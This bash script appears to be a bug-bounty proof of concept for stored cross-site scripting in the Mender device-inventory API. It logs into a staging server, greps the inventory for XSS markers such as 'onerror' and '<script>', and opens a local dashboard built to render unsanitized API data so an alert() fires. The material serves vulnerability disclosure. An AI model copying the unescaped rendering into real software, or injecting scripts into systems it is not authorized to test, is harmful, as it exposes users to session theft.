#!/bin/bash
################################################################################
# REAL XSS ATTACK TEST - Vulnerable Dashboard PoC
# This script demonstrates that XSS payloads from Mender API execute in 
# third-party dashboards.
################################################################################

echo "════════════════════════════════════════════════════════════════════════════"
echo "🔥 XSS ATTACK TEST - VULNERABLE DASHBOARD POC"
echo "════════════════════════════════════════════════════════════════════════════"
echo ""
echo "This test will:"
echo "  1. Get fresh authentication token"
echo "  2. Open vulnerable dashboard in browser"
echo "  3. Dashboard will fetch data from Mender API"
echo "  4. XSS payloads will EXECUTE (proving the vulnerability)"
echo ""

read -p "Enter your Mender email: " EMAIL
read -sp "Enter your password: " PASSWORD
echo ""

echo "[*] Authenticating to Mender API..."
TOKEN=$(curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Authorization: Basic $(echo -n "$EMAIL:$PASSWORD" | base64)")

if [ -z "$TOKEN" ]; then
    echo "[-] Authentication failed!"
    exit 1
fi

echo "[+] Authentication successful!"
echo "[+] Token obtained (${#TOKEN} chars)"
echo ""

# Verify we have devices with XSS payloads
echo "[*] Checking for XSS payloads in inventory..."
XSS_COUNT=$(curl -s "https://staging.hosted.mender.io/api/management/v1/inventory/devices" \
  -H "Authorization: Bearer $TOKEN" | grep -o 'onerror\|alert\|<script>' | wc -l)

echo "[+] Found $XSS_COUNT XSS indicators in device inventory"

if [ "$XSS_COUNT" -eq 0 ]; then
    echo ""
    echo "⚠️  WARNING: No XSS payloads found in current device inventory."
    echo "   The vulnerable dashboard will still open, but XSS won't execute."
    echo ""
fi

# Create HTML file with embedded token
HTML_FILE="/tmp/mender_attack_poc_$(date +%s).html"
cp /media/sf_vremen/hackerone/Northern.tech/vulnerable_dashboard.html "$HTML_FILE"

echo ""
echo "════════════════════════════════════════════════════════════════════════════"
echo "🚀 LAUNCHING ATTACK..."
echo "════════════════════════════════════════════════════════════════════════════"
echo ""
echo "Dashboard file: $HTML_FILE"
echo ""
echo "INSTRUCTIONS:"
echo "  1. The vulnerable dashboard will open in your browser"
echo "  2. Paste this token into the input field:"
echo ""
echo "     $TOKEN"
echo ""
echo "  3. Click 'Load Devices from Mender API'"
echo "  4. Watch for alert() popup - THIS IS THE XSS EXECUTING!"
echo ""
echo "EXPECTED RESULT:"
echo "  ✅ Alert popup appears with 'XSS PAYLOAD EXECUTED!'"
echo "  ✅ Red border appears around page"
echo "  ✅ Red banner confirms vulnerability"
echo ""

# Try to open in browser
if command -v xdg-open &> /dev/null; then
    echo "[*] Opening dashboard in browser..."
    xdg-open "$HTML_FILE"
elif command -v open &> /dev/null; then
    echo "[*] Opening dashboard in browser..."
    open "$HTML_FILE"
else
    echo "[*] Please manually open: $HTML_FILE"
fi

echo ""
echo "════════════════════════════════════════════════════════════════════════════"
echo "📝 PROOF OF VULNERABILITY"
echo "════════════════════════════════════════════════════════════════════════════"
echo ""
echo "If alert() popup appeared:"
echo "  ✅ XSS vulnerability is 100% CONFIRMED"
echo "  ✅ This is a REAL attack, not theoretical"
echo "  ✅ Third-party dashboards ARE vulnerable"
echo ""
echo "This proves:"
echo "  - Mender API returns unsanitized HTML"
echo "  - XSS executes in real browser environment"
echo "  - Developers who trust API data are at risk"
echo ""
echo "════════════════════════════════════════════════════════════════════════════"
